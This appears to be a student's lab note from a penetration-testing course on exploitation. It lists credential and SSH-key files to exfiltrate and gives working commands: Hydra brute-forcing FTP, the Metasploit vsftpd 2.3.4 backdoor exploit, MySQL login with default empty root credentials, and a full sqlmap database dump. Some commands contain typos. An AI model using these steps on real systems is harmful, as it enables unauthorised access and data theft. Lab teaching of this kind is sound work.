---
title: '4. Lab 4: Exploitation'
updated: 2023-04-23 04:14:00Z
created: 2023-04-22 20:55:19Z
---
# **Exploitation**
- Exploitation is when we take our enumerated targets and capitalize on them.
- REMEMBER WHAT I SAID ABOUT CON COLLEGE
- As you progress through the exploition process, document your results to the best of your ability for your report. Feel free to look ahead to Lab 5 if you need guidance on what to document.

## **Linux Exfiltration Target Files:**
- These are all target files we should keep a lookout for as they hold confidential information that could compromise CIA
	- /etc/passwd
	- /etc/shadow
	- /etc/issue
	- /etc/group
	- /etc/hostname
	- /etc/ssh/ssh_config
	- /etc/ssh/sshd_config
	- /root/.ssh/id_rsa
	- /root/.ssh/authorized_keys
	- /home/user/.ssh/authorized_keys
	- /home/user/.ssh/id_rsa

## Using Hydra to Bruteforce and Exploit FTP Manually
- Hydra is a credential bruteforcing tool included with Kali Linux
	- Type 'hydra -hh' in your terminal to view Hydra's full functioanlity:
- To bruteforce with Hydra, we will once again use wordlists, but this time we will use credential lists
	- In your Kali terminal type the following:
		- hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.1.139 -o /home/user/Documents/hydra_ftp.txt
			- The -C flag tells Hydra that the wordlist we are providing has credentials in a 'username:password' format.
			- The -o flag tells Hydra we want to output the results to a text file called hydra_ftp in our Documents folder.
	- Now that we have some credentials from Hydra, type the following in your terminal:
		- ftp 192.168.9.239
			- You will be prompted to log in.
			- Let's try some credential form our bruteforce attack:
			- Username: "user" : Password: "user"
			- Check the current working directory with "pwd"
			- Check the folders and files with "dir"
			- Move back a directory with "cd .."
			- One more time "cd .."
			- "dir" to view all files and folders again
			- See any files worth exfiltrating?
			- Use "get <filename>" in your terminal to retrieve them

## Exploiting FTP With Metasploit
- In your Kali terminal type **msfconsole**
- This is where our vulnerability research comes in handy.
- **msfconsole>** search 'ftp'
	- [NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- **msf**> use exploit/unix/ftp/vsftpd_234_backdoor
- **msf** > set RHOSTS 192.168.9.239
- **msf** > run

## Exploiting MySql Manually
- To log into MySql, we use the following login template in our terminals:
	- mysql -h {hostname} -u username -p {databasename}
- Since we don't have any credentials yet, let's do some research on default MySql creds
	- [MySQL - What is the Default Username and Password?](https://dbschema.com/2020/04/21/mysql-default-username-password/#:~:text=The%20default%20user%20for%20MySQL,it%20and%20choose%20another%20one.)
- Using info from our research, we can try the default credentials for MySql
- In your terminal type:
	- mysql -u root -h 192.168.1.103 -p
		- Here we use the -u flag to specify the username 'root'
		- Since the default password for MySql is empty, we leave the -p (password) flag empty
- Using MySQL in the terminal:
	- From the mysql> prompt:
	- SHOW DATABASES
		- "use 'database_name'"
			- SHOW TABLES

## Exploiting MySql With SqlMap
- You may have noticed some of the other options for SqlMap in the enumeration step. Now is when we get to use them.
- In your terminal, type the following:
	- sqlmap -d "mysql://root:@192.168.9.239:3306/" ---dump-all --output-dir=/home/user/Documents/ 
	- This step dumps the contents of the entire database to our machine. Take a look.
	

